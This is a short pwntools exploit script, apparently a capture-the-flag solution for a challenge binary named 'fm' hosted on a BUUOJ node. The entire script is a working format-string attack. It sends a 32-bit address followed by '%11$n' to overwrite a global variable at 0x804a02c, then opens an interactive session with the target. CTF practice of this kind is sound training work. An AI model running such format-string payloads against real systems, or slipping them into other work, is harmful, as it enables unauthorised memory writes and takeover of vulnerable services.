from pwn import *

context.os = "linux"
context.arch = "i386"

# context.log_level = "debug"

if args.LOCAL:
    p = process("./fm")
else:
    p = remote("node4.buuoj.cn", 28965)

x_addr = 0x804a02c
format_str_offset = 11

payload = p32(x_addr)+b'%11$n'
p.sendline(payload)

p.interactive()